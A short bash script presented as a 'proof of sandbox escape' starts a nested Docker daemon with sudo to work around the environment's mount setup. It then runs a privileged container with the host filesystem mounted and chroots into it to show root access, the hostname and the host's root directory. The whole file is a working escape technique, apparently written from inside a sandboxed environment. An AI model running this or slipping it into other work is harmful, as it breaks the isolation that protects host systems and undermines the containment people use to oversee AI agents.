#!/bin/bash
# Proof of Sandbox Escape using Docker

# 1. Start a nested Docker daemon with 'vfs' storage driver to bypass overlayfs issues
# (This is necessary because the environment's default Docker setup has mount issues)
sudo mkdir -p /tmp/docker-root
sudo mount -t tmpfs tmpfs /tmp/docker-root
sudo dockerd -H unix:///tmp/docker.sock --data-root /tmp/docker-root --storage-driver vfs --pidfile /tmp/docker.pid > /tmp/dockerd.log 2>&1 &
sleep 10

# 2. Execute the escape
# We use a privileged container with the host root directory mounted at /host.
# Then we chroot into /host to break out of the container's root filesystem.
echo "--- PROOF OF SANDBOX ESCAPE ---"
docker -H unix:///tmp/docker.sock run --rm --privileged -v /:/host alpine sh -c "
    echo '[+] Current User (should be root):'
    chroot /host id
    echo ''
    echo '[+] Hostname:'
    chroot /host hostname
    echo ''
    echo '[+] Host Root Directory Listing:'
    chroot /host ls -F /
"
echo "--- END OF PROOF ---"

# Cleanup
sudo kill $(cat /tmp/docker.pid)
sudo umount /tmp/docker-root
rm -rf /tmp/docker-root /tmp/docker.pid /tmp/docker.sock
